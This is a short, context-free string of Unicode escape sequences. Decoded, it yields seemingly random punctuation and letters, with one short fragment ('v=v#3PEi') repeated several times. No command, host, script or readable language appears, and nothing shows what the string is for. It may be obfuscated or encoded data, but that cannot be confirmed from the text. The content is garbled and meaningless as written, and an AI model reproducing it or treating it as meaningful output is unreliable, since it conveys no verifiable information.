\u0073\u007b\u005b\u0061\u0052\u0055\u006a\u004a\u0057\u0054\u004e\u0071\u005d\u005d\u0031\u006b\u005b\u003c\u003f\u007c\u0049\u007c\u0046\u0059\u0077\u0056\u0058\u004c\u006a\u0060\u004a\u007a\u0031\u0076\u004d\u0059\u004f\u0072\u0023\u004f\u0039\u0037\u007e\u0032\u004e\u0079\u0046\u0023\u005b\u004b\u0055\u0061\u0073\u0062\u0031\u002b\u006a\u0056\u0046\u0044\u003b\u003a\u003a\u0060\u006d\u004b\u0033\u0076\u002c\u003e\u005d\u0074\u003f\u0073\u0037\u003c\u0065\u0048\u0069\u0063\u0051\u0059\u0077\u0021\u002f\u0045\u003f\u0044\u005d\u0031\u0079\u0075\u007c\u0076\u003d\u0076\u0023\u0033\u0050\u0045\u0069\u004a\u0039\u002b\u0031\u003d\u0051\u002b\u0074\u007e\u0031\u002e\u0054\u004e\u0071\u005d\u006a\u003e\u0046\u0033\u0076\u003d\u0076\u0023\u0033\u0050\u0045\u0069\u0058\u0035\u0051\u0028\u0053\u0055\u0053\u0030\u0073\u003e\u005e\u003b\u0063\u002f\u0059\u005f\u004a\u004b\u0057\u0056\u0054\u0076\u0073\u0048\u0053\u005f\u0041\u002a\u0049\u006b\u002e\u002c\u0060\u0051\u0059\u004f\u0067\u002b\u0076\u003d\u0076\u0023\u0033\u0050\u0045\u0069\u003d\u0035\u0077\u003c\u0041\u0021\u004b\u0047\u0065\u005b\u0057\u0067\u006e\u0076\u004d\u0029\u003a\u0073\u0066\u0069\u0022\u0059\u0023\u0067\u0076\u0078\u0050\u0034\u0049\u0065\u002c\u007c\u0040\u0069\u0059\u0075\u0073\u003e\u0040\u004f\u0036\u0076\u003d\u0076\u0023\u0033\u0050\u0045\u0069\u006f\u0039\u0024\u0037\u0028\u0061\u0076\u0052\u0062\u0073\u002c\u0078\u0040\u007e\u0059\u002c\u0042\u0046\u005d\u0029\u0043\u0036\u004e\u004d\u004d\u002c\u004d